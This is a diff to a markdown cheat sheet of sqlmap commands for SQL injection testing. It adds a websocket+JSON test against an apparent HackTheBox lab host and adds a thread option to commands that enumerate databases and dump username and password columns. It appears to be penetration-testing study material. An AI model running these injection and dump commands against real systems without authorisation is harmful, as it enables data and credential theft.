@@ -11,6 +11,11 @@ sqlmap --proxy             <--Use a proxy like Burp to replay requests
 > [!NOTE] NOTE
 > It's always good to randomize the agent every time with `--random-agent`
 
+Websocket + JSON testing
+```bash
+sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"123"}' --batch
+```
+
 Batch test (`-u` for GET `--data` for POST)
 ```shell
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
@@ -69,14 +74,14 @@ sqlmap ... --union-cols=5      <-- Specify amount of columns for Union based
 ### Database Enumeration
 Banner, current user, database and is database Admin
 ```shell
-sqlmap ...  --banner --current-user --current-db --is-dba
+sqlmap ...  --banner --current-user --current-db --is-dba --threads 10 
 ```
 List databases, tables, table contents, specific table rows (start at row 3 stop at 10)
 ```shell
-sqlmap ... --dbs
-sqlmap ... -D testDB --tables
-sqlmap ... -D testdb -T users --dump
-sqlmap ... -D testdb -T users -C username,password --dump
+sqlmap ... --dbs --threads 10 
+sqlmap ... -D testDB --tables --threads 10 
+sqlmap ... -D testdb -T users --dump --threads 10 
+sqlmap ... -D testdb -T users -C username,password --dump --threads 10 
 sqlmap ... -D testdb -T users -C username,password --dump --start=3 --stop=10
 ```
 Conditional enumeration
@@ -85,7 +90,7 @@ sqlmap ... -D testdb -T users --dump --where="username LIKE 'admin%'"
 ```
 Dump all tables and databases
 ```shell
-sqlmap ... --dump
+sqlmap ... --dump --threads 10 
 sqlmap ... --dump-all
 sqlmap ... --dump-all --exclude-sysdbs
 ```
